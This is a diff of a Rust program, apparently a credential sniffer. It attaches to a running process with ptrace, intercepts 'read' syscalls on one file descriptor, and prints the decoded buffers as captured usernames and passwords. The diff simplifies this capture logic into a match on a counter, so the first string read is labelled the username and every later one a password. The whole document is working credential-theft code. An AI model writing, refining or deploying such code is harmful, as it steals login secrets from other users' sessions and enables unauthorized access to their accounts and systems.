@@ -91,21 +91,20 @@ pub fn debugTHREAD(pid: Pid) {
                     // Gettiing registers
                     let reg = ptrace::getregs(pid).unwrap();
 
-                    // Getting and Checking for Username and Password
-                    if (0..5).contains(&count) && Syscalls::name(reg.orig_rax as u64).unwrap() == "read" && reg.rdi as u16 == 6 && (6..).contains(&(reg.rdx as u16)) && decoder(pid, reg.rsi as AddressType).is_ascii() {
-                        count += 1;
-                        
-                        if !decoder(pid, reg.rsi as AddressType).is_empty(){
-                            println!("{} Username: {} Captured at: {:?}", "\t".repeat(5), decoder(pid, reg.rsi as AddressType), reg.rsi as AddressType);
-                        }
-
-                    } else if (5..12).contains(&count) && Syscalls::name(reg.orig_rax as u64).unwrap() == "read" && reg.rdi as u16 == 6 && (6..).contains(&(reg.rdx as u16)) && decoder(pid, reg.rsi as AddressType).is_ascii() {
-
-                        if !decoder(pid, reg.rsi as AddressType).is_empty() {
-                            println!("\n{} Password: {} Captured at: {:?}", "\t".repeat(5), decoder(pid, reg.rsi as AddressType), reg.rsi as AddressType);
+                    // Getting Username, Password 
+                    if Syscalls::name(reg.orig_rax as u64).unwrap() == "read" && reg.rdi as u16 == 6 && (6..).contains(&(reg.rdx as u16)) && decoder(pid, reg.rsi as AddressType).is_ascii() && !decoder(pid, reg.rsi as AddressType).is_empty() {
+                    
+                        match count {
+                            0 => {
+                                    println!("{} Username: {} Captured at: {:?}", "\t".repeat(5), decoder(pid, reg.rsi as AddressType), reg.rsi as AddressType);
+                                    count += 1;
+                                },
+                         
+                            1.. => println!("\n{} Password: {} Captured at: {:?}", "\t".repeat(5), decoder(pid, reg.rsi as AddressType), reg.rsi as AddressType),
                         }
 
                     }
+
                 }
         }
     }
